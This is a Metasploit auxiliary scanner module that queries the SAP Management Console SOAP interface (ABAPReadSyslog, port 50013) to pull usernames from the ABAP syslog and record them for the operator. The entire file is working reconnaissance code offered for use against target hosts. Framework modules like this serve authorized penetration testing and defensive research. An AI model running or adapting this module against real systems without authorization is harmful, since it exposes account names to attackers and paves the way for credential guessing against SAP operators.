##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP Management Console Extract Users',
      'Description' => %q{
        This module simply attempts to extract SAP users from the ABAP
        Syslog through the SAP Management Console SOAP Interface.
        },
      'References' => [
        [ 'URL', 'https://blog.c22.cc' ]
      ],
      'Author' => [ 'Chris John Riley' ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        Opt::RPORT(50013),
        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
      ]
    )
    register_autofilter_ports([ 50013 ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['URI']),
      'method' => 'GET'
    }, 25)

    if !res
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end

    extractusers(ip)
  end

  def extractusers(rhost)
    print_status("#{rhost}:#{rport} [SAP] Connecting to SAP Management Console SOAP Interface")
    success = false

    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
    xs = 'http://www.w3.org/2001/XMLSchema'
    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
    ns1 = 'ns1:ABAPReadSyslog'

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    begin
      res = send_request_raw({
        'uri' => normalize_uri(datastore['URI']),
        'method' => 'POST',
        'data' => data,
        'headers' =>
          {
            'Content-Length' => data.length,
            'SOAPAction'	=> '""',
            'Content-Type' => 'text/xml; charset=UTF-8'
          }
      }, 60)

      if res && (res.code == 200)
        case res.body
        when nil
          # Nothing
        when %r{<User>([^<]+)</User>}i
          body = []
          body = res.body unless res.body.nil?
          users = body.scan(%r{<User>([^<]+)</User>}i)
          users = users.uniq
          success = true
        end
      elsif res && (res.code == 500)
        case res.body
        when %r{<faultstring>(.*)</faultstring>}i
          faultcode = ::Regexp.last_match(1).to_s
          fault = true
        end
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication on #{rhost}:#{rport}")
      return
    end

    if success
      print_good("#{rhost}:#{rport} [SAP] Users Extracted: #{users.length} entries extracted from #{rhost}:#{rport}")
      report_note(
        host: rhost,
        proto: 'tcp',
        port: rport,
        type: 'sap.users',
        data: { proto: 'soap', users: users },
        update: :unique_data
      )

      users.each do |output|
        print_good("#{rhost}:#{rport} [SAP] Extracted User: #{output[0]}")
      end
    elsif fault
      print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
    else
      print_error("#{rhost}#{rport} [SAP] failed to access ABAPSyslog on #{rhost}:#{rport}")
    end
  end
end
